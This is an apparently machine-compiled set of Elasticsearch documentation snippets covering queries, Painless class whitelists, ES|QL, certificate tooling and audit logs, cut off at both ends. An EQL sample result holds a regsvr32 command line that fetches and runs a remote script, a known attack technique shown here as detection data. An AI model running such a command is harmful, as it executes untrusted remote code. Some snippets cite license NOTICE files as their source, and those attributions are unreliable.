string\n\n`substring`\n:   A substring to locate in the input string\n\n`start`\n:   The start index\n```\n\n----------------------------------------\n\nTITLE: Saturation Function in Elasticsearch Rank Feature Queries\nDESCRIPTION: This snippet demonstrates the use of the saturation function in a rank_feature query to modify relevance scores. The function customizes the score of documents based on the pagerank field and a pivot parameter. This query requires a configured Elasticsearch index with appropriate rank feature fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-rank-feature-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /test/_search\n{\n  \"query\": {\n    \"rank_feature\": {\n      \"field\": \"pagerank\",\n      \"saturation\": {\n        \"pivot\": 8\n      }\n    }\n  }\n}\n\nGET /test/_search\n{\n  \"query\": {\n    \"rank_feature\": {\n      \"field\": \"pagerank\",\n      \"saturation\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Service Tokens Example\nDESCRIPTION: Command and output example for listing all service tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/service-tokens-command.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-service-tokens list\n```\n\nLANGUAGE: txt\nCODE:\n```\nelastic/fleet-server/my-token\nelastic/fleet-server/another-token\n```\n\n----------------------------------------\n\nTITLE: Implementing Amazon S3 Repository in Java\nDESCRIPTION: This code snippet defines an abstract class for Amazon S3 repositories in Elasticsearch. It includes methods for initializing the repository, handling bucket names, and managing blob names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-ec2/licenses/slf4j-api-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nabstract class S3Repository extends BlobStoreRepository {\n    private final String bucket;\n    private final ByteSizeValue bufferSize;\n    private final boolean serverSideEncryption;\n    private final AwsS3Service awsS3Service;\n    private final String clientName;\n    protected final String basePath;\n\n    S3Repository(\n        final RepositoryMetadata metadata,\n        final NamedXContentRegistry namedXContentRegistry,\n        final BlobStoreFactory blobStoreFactory,\n        final AwsS3Service awsS3Service,\n        final String bucket,\n        final ByteSizeValue bufferSize,\n        final boolean serverSideEncryption,\n        final String clientName,\n        final String basePath\n    ) {\n        super(\n            metadata,\n            namedXContentRegistry,\n            blobStoreFactory.create(metadata, S3BlobStore.TYPE, buildSettings(metadata, bucket, serverSideEncryption, clientName))\n        );\n        this.awsS3Service = awsS3Service;\n        this.bucket = bucket;\n        this.bufferSize = bufferSize;\n        this.serverSideEncryption = serverSideEncryption;\n        this.clientName = clientName;\n        this.basePath = basePath;\n    }\n\n    private static Map<String, String> buildSettings(\n        RepositoryMetadata metadata,\n        String bucket,\n        boolean serverSideEncryption,\n        String clientName\n    ) {\n        final Map<String, String> settings = new HashMap<>(metadata.settings());\n        settings.put(S3BlobStore.BUCKET, bucket);\n        if (serverSideEncryption) {\n            settings.put(S3BlobStore.SERVER_SIDE_ENCRYPTION, Boolean.toString(serverSideEncryption));\n        }\n        if (clientName != null) {\n            settings.put(S3BlobStore.CLIENT_NAME, clientName);\n        }\n        return settings;\n    }\n\n    @Override\n    protected BlobPath basePath() {\n        return new BlobPath().add(basePath);\n    }\n\n    @Override\n    protected ByteSizeValue chunkSize() {\n        return bufferSize;\n    }\n\n    @Override\n    public boolean hasAtomicOverwrites() {\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Access Control Index Document\nDESCRIPTION: This JavaScript code snippet shows an example document from the access control index created by the SharePoint Online connector. The document contains the Elasticsearch query that describes which documents a specific user has access to, based on the `access_control` field. This example is used to configure DLS for the user `john@example.com`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-e2e-guide.md#2025-04-21_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"_index\": \".search-acl-filter-search-sharepoint\",\n  \"_id\": \"john@example.co\",\n  \"_version\": 1,\n  \"_seq_no\": 0,\n  \"_primary_term\": 1,\n  \"found\": true,\n  \"_source\": {\n    \"identity\": {\n      \"email\": \"john@example.co\",\n      \"access_control\": [\n        \"john@example.co\",\n        \"Engineering Members\"\n      ]\n    },\n    \"query\": {\n      \"template\": {\n        \"params\": {\n          \"access_control\": [\n            \"john@example.co\",\n            \"Engineering Members\"\n            ]\n        },\n        \"source\": \"\"\"\n        {\n          \"bool\": {\n            \"should\": [\n              {\n                \"bool\": {\n                  \"must_not\": {\n                    \"exists\": {\n                      \"field\": \"_allow_access_control\"\n                    }\n                  }\n                }\n              },\n              {\n                \"terms\": {\n                  \"_allow_access_control.enum\": {{#toJson}}access_control{{/toJson}}\n                }\n              }\n            ]\n          }\n        }\n        \"\"\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Debug Response for _source Context\nDESCRIPTION: Shows the response from Debug.explain revealing the internal structure and type of the _source context object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-debugging.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\n{\n  \"error\" : {\n    \"root_cause\": ...,\n    \"type\": \"illegal_argument_exception\",\n    \"reason\": \"failed to execute script\",\n    \"caused_by\": {\n      \"type\": \"script_exception\",\n      \"to_string\": \"{gp=[26, 82, 1], last=gaudreau, assists=[17, 46, 0], first=johnny, goals=[9, 27, 1]}\",\n      \"painless_class\": \"java.util.LinkedHashMap\",\n      \"java_class\": \"java.util.LinkedHashMap\",\n      ...\n    }\n  },\n  \"status\": 400\n}\n```\n\n----------------------------------------\n\nTITLE: Japanese Normal Tokenization Example\nDESCRIPTION: Example output of kuromoji_tokenizer in normal mode showing basic segmentation without compound decomposition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n関西国際空港\nアブラカダブラ\n```\n\n----------------------------------------\n\nTITLE: Hexadecimal Formatting Utilities in Java\nDESCRIPTION: This snippet defines the HexFormat class, which provides utility functions for formatting and parsing hexadecimal numbers. This includes methods for specifying delimiters and cases in hex representation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_21\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.HexFormat {\n  HexFormat of()\n  HexFormat ofDelimiter(String)\n  HexFormat withDelimiter(String)\n  HexFormat withPrefix(String)\n  HexFormat withSuffix(String)\n  HexFormat withUpperCase()\n  HexFormat withLowerCase()\n  String delimiter()\n  String prefix()\n  String suffix()\n  boolean isUpperCase()\n  String formatHex(byte[])\n  String formatHex(byte[],int,int)\n  byte[] parseHex(CharSequence)\n  byte[] parseHex(CharSequence,int,int)\n}\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Search Result in Elasticsearch\nDESCRIPTION: Shows the response format for an EQL sequence search, including the matching sequence of events with their details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_4\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"hits\": {\n    \"total\": ...,\n    \"sequences\": [\n      {\n        \"events\": [\n          {\n            \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n            \"_id\": \"OQmfCaduce8zoHT93o4H\",\n            \"_source\": {\n              \"@timestamp\": \"2099-12-07T11:07:09.000Z\",\n              \"event\": {\n                \"category\": \"process\",\n                \"id\": \"aR3NWVOs\",\n                \"sequence\": 4\n              },\n              \"process\": {\n                \"pid\": 2012,\n                \"name\": \"regsvr32.exe\",\n                \"command_line\": \"regsvr32.exe  /s /u /i:https://...RegSvr32.sct scrobj.dll\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n              }\n            }\n          },\n          {\n            \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n            \"_id\": \"yDwnGIJouOYGBzP0ZE9n\",\n            \"_source\": {\n              \"@timestamp\": \"2099-12-07T11:07:10.000Z\",\n              \"event\": {\n                \"category\": \"file\",\n                \"id\": \"tZ1NWVOs\",\n                \"sequence\": 5\n              },\n              \"process\": {\n                \"pid\": 2012,\n                \"name\": \"regsvr32.exe\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n              },\n              \"file\": {\n                \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n                \"name\": \"scrobj.dll\"\n              }\n            }\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running the Connector Service\nDESCRIPTION: This command is used to run the connector service after configuration. It requires navigating to the cloned or forked repository directory and running a make command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-postgresql-connector-client-tutorial.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncd into the root of your `connectors` clone/fork.\nmake run\n\n```\n\n----------------------------------------\n\nTITLE: Importing PostgreSQL Example Data\nDESCRIPTION: Docker commands to copy the sample data into the PostgreSQL container and execute the SQL script to create tables and import data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ndocker cp ~/data/Chinook_PostgreSql.sql postgres:/\ndocker exec -it postgres psql -U myuser -f /Chinook_PostgreSql.sql\n```\n\n----------------------------------------\n\nTITLE: Range Aggregation on Histogram Fields in Elasticsearch\nDESCRIPTION: Demonstrates range aggregation on pre-aggregated histogram fields for latency metrics across different networks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-range-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT metrics_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"network\": {\n        \"properties\": {\n          \"name\": {\n            \"type\": \"keyword\"\n          }\n        }\n      },\n      \"latency_histo\": {\n         \"type\": \"histogram\"\n      }\n    }\n  }\n}\n\nPUT metrics_index/_doc/1?refresh\n{\n  \"network.name\" : \"net-1\",\n  \"latency_histo\" : {\n      \"values\" : [1, 3, 8, 12, 15],\n      \"counts\" : [3, 7, 23, 12, 6]\n   }\n}\n\nPUT metrics_index/_doc/2?refresh\n{\n  \"network.name\" : \"net-2\",\n  \"latency_histo\" : {\n      \"values\" : [1, 6, 8, 12, 14],\n      \"counts\" : [8, 17, 8, 7, 6]\n   }\n}\n\nGET metrics_index/_search?size=0&filter_path=aggregations\n{\n  \"aggs\": {\n    \"latency_ranges\": {\n      \"range\": {\n        \"field\": \"latency_histo\",\n        \"ranges\": [\n          {\"to\": 2},\n          {\"from\": 2, \"to\": 3},\n          {\"from\": 3, \"to\": 10},\n          {\"from\": 10}\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running a Terms Aggregation on Pre-aggregated Data in Elasticsearch\nDESCRIPTION: This snippet shows how to run a terms aggregation on the my_text field. The _doc_count field will be automatically respected when computing the document counts for each bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-doc-count-field.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n    \"aggs\" : {\n        \"histogram_titles\" : {\n            \"terms\" : { \"field\" : \"my_text\" }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing REST API Compatibility Headers for JSON Format\nDESCRIPTION: Example of the Accept header required to request REST API compatibility when making a request without a body, specifying compatibility with Elasticsearch version 7.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nAccept: \"application/vnd.elasticsearch+json;compatible-with=7\"\n```\n\n----------------------------------------\n\nTITLE: Defining DoubleStream.Builder Interface in Painless - Java\nDESCRIPTION: Represents a builder for DoubleStream, useful for constructing streams incrementally. It allows adding elements one by one and then building the complete stream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.DoubleStream$Builder {\n  DoubleStream.Builder add(double)\n  DoubleStream build()\n}\n```\n\n----------------------------------------\n\nTITLE: Describing MV_SLICE Function Usage in ESQL\nDESCRIPTION: Explains the purpose and usage of the MV_SLICE function in Elasticsearch SQL. It highlights that the function is useful for extracting subsets from multivalued fields, especially when combined with functions like SPLIT or MV_SORT that produce ordered results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_slice.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nReturns a subset of the multivalued field using the start and end index values. This is most useful when reading from a function that emits multivalued columns in a known order like [`SPLIT`](/reference/query-languages/esql/functions-operators/string-functions.md#esql-split) or [`MV_SORT`](/reference/query-languages/esql/functions-operators/mv-functions.md#esql-mv_sort).\n\nThe order that [multivalued fields](/reference/query-languages/esql/esql-multivalued-fields.md) are read from\nunderlying storage is not guaranteed. It is **frequently** ascending, but don't\nrely on that.\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch API Key Creation Response\nDESCRIPTION: This JavaScript code snippet shows the response from the Elasticsearch Create API Key API. The response contains the `id`, `name`, `expiration`, `api_key`, and `encoded` values for the newly created API key. The `api_key` can be used to query the Search Application with the defined DLS restrictions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-e2e-guide.md#2025-04-21_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"id\": \"0rCD3i-MjKsw4g9BpRIBa\",\n  \"name\": \"john-api-key\",\n  \"expiration\": 1687881715555,\n  \"api_key\": \"zTxre9L6TcmRIgd2NgLCRg\",\n  \"encoded\": \"Qk05dy1JZ0JhRDNyNGpLQ3MwUmk6elRzdGU5QjZUY21SSWdkMldnQ1RMZw==\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating extension metadata for local file upload in Elasticsearch Service\nDESCRIPTION: Creates the metadata for an extension that will be uploaded from a local file. This is the first step in a two-step process for uploading extensions from local files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X POST \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"extension_type\": \"plugin\",\n    \"name\": \"custom-plugin\",\n    \"version\" : \"8.4.3\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Defining Elasticsearch Plugin Types in Markdown\nDESCRIPTION: This markdown snippet defines two types of Elasticsearch plugins: text analysis plugins using the stable API, and classic plugins for other functionalities. It provides links to more detailed documentation for each type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/index.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n[Creating text analysis plugins with the stable plugin API](/extend/creating-stable-plugins.md)\n:   Text analysis plugins can be developed against the stable plugin API to provide {{es}} with custom Lucene analyzers, token filters, character filters, and tokenizers.\n\n[Creating classic plugins](/extend/creating-classic-plugins.md)\n:   Other plugins can be developed against the classic plugin API to provide custom authentication, authorization, or scoring mechanisms, and more.\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Authentication Types for HTTP in Elasticsearch\nDESCRIPTION: YAML configuration for setting up multiple authentication types in Elasticsearch. This establishes a fallback chain where if the first authentication type fails, Elasticsearch tries subsequent types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.type: [pki, basic]\nxpack.security.http.authentication.realm: [pki1, file]\n```\n\n----------------------------------------\n\nTITLE: Including External Markdown File in Elasticsearch Documentation\nDESCRIPTION: This snippet demonstrates how to include an external Markdown file named 'cast.md' from the 'layout' directory into the current document. This is commonly used in documentation frameworks to modularize content and improve maintainability.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/cast.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} layout/cast.md\n:::\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Documentation for a function that takes two numeric parameters. Both parameters are numeric expressions that return null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/hypot.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number1`\n:   Numeric expression. If `null`, the function returns `null`.\n\n`number2`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Creating a PEM Certificate with a Specific Hostname\nDESCRIPTION: Creates a certificate and key pair in PEM format with a specific hostname 'not.this.host' signed by the CA1 certificate. Used for testing SSL hostname verification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nnew-pem-cert not-this-host.crt not-this-host.key \"\" \"not-this-host\" \"ca1.p12\" \"ca1-p12-password\" --dns not.this.host\n```\n\n----------------------------------------\n\nTITLE: Creating Certificate Authority for Elasticsearch in Bash\nDESCRIPTION: Generates a Certificate Authority (CA) in PEM format with a 9999-day validity period and 2048-bit key size. The script creates the CA files, extracts them from the zip archive, and cleans up temporary files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/qa/saml-rest-tests/src/javaRestTest/resources/ssl/README.txt#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nelasticsearch-certutil ca --pem --out ${PWD}/ca.zip -days 9999 -keysize 2048 -ca-dn \"CN=Certificate Authority,DC=localhost\"\nunzip ca.zip\nmv ca/ca.* ./\nrmdir ca\nrm ca.zip\n```\n\n----------------------------------------\n\nTITLE: EQL Pipe Example\nDESCRIPTION: Shows how to use the tail pipe to limit results to most recent events.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_27\n\nLANGUAGE: eql\nCODE:\n```\nauthentication where agent.id == 4624\n| tail 10\n```\n\n----------------------------------------\n\nTITLE: Cleaning Up Elasticsearch Resources in Bash\nDESCRIPTION: Removes the Elasticsearch Docker container and deletes the shared data directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\ndocker rm -f es\nrm -rf /tmp/sharedESData/\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Compatibility Table in Markdown\nDESCRIPTION: A markdown table showing the input type combinations (lhs and rhs) and their resulting output types for ESQL operations. Includes numeric types like double, integer, long, and unsigned_long.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/div.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| lhs | rhs | result |\n| --- | --- | --- |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| integer | double | double |\n| integer | integer | integer |\n| integer | long | long |\n| long | double | double |\n| long | integer | long |\n| long | long | long |\n| unsigned_long | unsigned_long | unsigned_long |\n```\n\n----------------------------------------\n\nTITLE: Querying Tables with Multi-Target Syntax in Elasticsearch SQL\nDESCRIPTION: Example showing how to use Elasticsearch multi-target syntax to show tables matching a pattern that excludes indices starting with 'l'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-index-patterns.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES \"*,-l*\";\n```\n\n----------------------------------------\n\nTITLE: Setting Mandatory Ingest Plugin in Elasticsearch Configuration\nDESCRIPTION: Configuration example showing how to mark an ingest plugin as mandatory in elasticsearch.yml. When a plugin is marked as mandatory, Elasticsearch nodes will fail to start if the plugin is not installed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/index.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nplugin.mandatory: my-ingest-plugin\n```\n\n----------------------------------------\n\nTITLE: Defining Stream Interface in Painless - Java\nDESCRIPTION: Specifies the Stream interface, which processes sequences of objects. It contains generic methods for various stream operations, such as map, filter, reduce, and collect.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.Stream {\n  boolean allMatch(Predicate)\n  boolean anyMatch(Predicate)\n  Stream.Builder builder()\n  def collect(Collector)\n  def collect(Supplier,BiConsumer,BiConsumer)\n  Stream concat(Stream,Stream)\n  long count()\n  Stream distinct()\n  Stream empty()\n  Stream filter(Predicate)\n  Optional findAny()\n  Optional findFirst()\n  Stream flatMap(Function)\n  DoubleStream flatMapToDouble(Function)\n  IntStream flatMapToInt(Function)\n  LongStream flatMapToLong(Function)\n  void forEach(Consumer)\n  void forEachOrdered(Consumer)\n  Stream limit(long)\n  Stream map(Function)\n  DoubleStream mapToDouble(ToDoubleFunction)\n  IntStream mapToInt(ToIntFunction)\n  LongStream mapToLong(ToLongFunction)\n  Optional max(Comparator)\n  Optional min(Comparator)\n  boolean noneMatch(Predicate)\n  Stream of(def[])\n  Stream peek(Consumer)\n  Optional reduce(BinaryOperator)\n  def reduce(def,BinaryOperator)\n  def reduce(def,BiFunction,BinaryOperator)\n  Stream skip(long)\n  Stream sorted()\n  Stream sorted(Comparator)\n  def[] toArray()\n  def[] toArray(IntFunction)\n}\n```\n\n----------------------------------------\n\nTITLE: Defining NumberSortScript Class for Painless\nDESCRIPTION: This code snippet defines a class 'NumberSortScript' that is part of the whitelisting process allowing Painless scripts to access the field API's functionalities. It does not import any external packages and is structured to provide the necessary foundation for script execution within Elasticsearch. The class does not contain any methods or attributes at this stage.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.number_sort.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.script.NumberSortScript @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Double Class Methods and Constants in Java\nDESCRIPTION: This snippet shows the public methods and constants of the java.lang.Double class. It includes constants like MAX_VALUE and MIN_VALUE, and methods for comparing, parsing, and manipulating double values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_9\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Double {\n  int BYTES\n  int MAX_EXPONENT\n  double MAX_VALUE\n  int MIN_EXPONENT\n  double MIN_NORMAL\n  double MIN_VALUE\n  double NaN\n  double NEGATIVE_INFINITY\n  double POSITIVE_INFINITY\n  int SIZE\n  int compare(double,double)\n  int compareTo(Double)\n  long doubleToLongBits(double)\n  long doubleToRawLongBits(double)\n  int hashCode(double)\n  boolean isFinite(double)\n  boolean isInfinite()\n  boolean isInfinite(double)\n  boolean isNaN()\n  boolean isNaN(double)\n  double longBitsToDouble(long)\n  double max(double,double)\n  double min(double,double)\n  double parseDouble(String)\n  double sum(double,double)\n  String toHexString(double)\n  String toString(double)\n  Double valueOf(double)\n}\n```\n\n----------------------------------------\n\nTITLE: Base64 Encoded Binary Data\nDESCRIPTION: A large block of base64 encoded binary data, likely representing binary file contents or a binary data stream. The data appears to be encoded using standard base64 encoding.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/src/main/resources/org/elasticsearch/xpack/ml/inference.nlp.tokenizers/spm_precompiled_normalizer.txt#2025-04-21_snippet_4\n\nLANGUAGE: base64\nCODE:\n```\n7Y23AO2NuADtjbkA7Y26AO2NuwDtjbwA7Y29AO2NvgDtjb8A7Y6AAO2OgQDtjoIA7Y6DAO2OhADtjoUA7Y6GAO2OhwDtjogA7Y6JAO2OigDtjosA7Y6MAO2OjQDtjo4A7Y6PAO2OkADtjpEA7Y6SAO2OkwDtjpQA7Y6VAO2OlgDtjpcA7Y6YAO2OmQDtjpoA7Y6bAO2OnADtjp0A7Y6eAO2OnwDtjqAA7Y6hAO2OogDtjqMA7Y6kAO2OpQDtjqYA7Y6nAO2OqADtjqkA7Y6qAO2OqwDtjqwA7Y6tAO2OrgDtjq8A...\n```\n\n----------------------------------------\n\nTITLE: Creating Mappings for the Seats Index in Elasticsearch\nDESCRIPTION: Creates mappings for the 'seats' index with properties for theatre, play, actors, date, time, cost, row, number, sold status, and datetime fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-context-examples.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /seats\n{\n  \"mappings\": {\n    \"properties\": {\n      \"theatre\":  { \"type\": \"keyword\" },\n      \"play\":     { \"type\": \"keyword\" },\n      \"actors\":   { \"type\": \"keyword\" },\n      \"date\":     { \"type\": \"keyword\" },\n      \"time\":     { \"type\": \"keyword\" },\n      \"cost\":     { \"type\": \"double\"  },\n      \"row\":      { \"type\": \"integer\" },\n      \"number\":   { \"type\": \"integer\" },\n      \"sold\":     { \"type\": \"boolean\" },\n      \"datetime\": { \"type\": \"date\"    }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Static Import of Domain Split Functions in Java\nDESCRIPTION: This code snippet demonstrates how to statically import two overloaded `domainSplit` functions from the `org.elasticsearch.xpack.ml.utils.DomainSplitFunction` class. The static import allows direct access to these functions without needing to qualify them with the class name.  This is often used for utility functions that are frequently called.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/src/main/resources/org/elasticsearch/xpack/ml/whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nstatic_import {\n    List domainSplit(String) from_class org.elasticsearch.xpack.ml.utils.DomainSplitFunction\n    List domainSplit(String,Map) from_class org.elasticsearch.xpack.ml.utils.DomainSplitFunction\n}\n```\n\n----------------------------------------\n\nTITLE: Capturing Run As Denied Event in Elasticsearch\nDESCRIPTION: Example JSON audit log entry for when a run-as authentication request is denied. Shows fields like timestamp, node ID, user details, and request information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_17\n\nLANGUAGE: json\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:49:34,859+0200\", \"node.id\": \"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"transport\", \"event.action\": \"run_as_denied\", \"user.name\":\"user1\", \"user.run_as.name\":\"user1\", \"user.realm\":\"default_native\", \"user.run_as.realm\":\"default_native\", \"user.roles\":[\"test_role\"], \"origin.type\":\"rest\", \"origin.address\": \"[::1]:52662\", \"request.id\":\"RcaSt872RG-R_WJBEGfYXA\", \"action\":\"indices:data/read/search\", \"request.name\":\"SearchRequest\", \"indices\":[\"alias1\"]}\n```\n\n----------------------------------------\n\nTITLE: Moman/Finenight FSA Package License\nDESCRIPTION: MIT license terms for the Moman/Finenight FSA package used to generate levenshtein automata tables\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-icu/licenses/lucene-LICENSE.txt#2025-04-21_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# Copyright (c) 2010, Jean-Philippe Barrette-LaPierre, <jpb@rrette.com>\n#\n# Permission is hereby granted, free of charge, to any person\n# obtaining a copy of this software and associated documentation\n# files (the \"Software\"), to deal in the Software without\n# restriction, including without limitation the rights to use,\n# copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the\n# Software is furnished to do so, subject to the following\n# conditions:\n#\n# The above copyright notice and this permission notice shall be\n# included in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n# OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n```\n\n----------------------------------------\n\nTITLE: Defining CloneNotSupportedException in Java\nDESCRIPTION: This snippet defines the java.lang.CloneNotSupportedException class, thrown to indicate that the `clone` method in class `Object` has been called to clone an object, but that the object's class does not implement the `Cloneable` interface. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_31\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.CloneNotSupportedException {\n  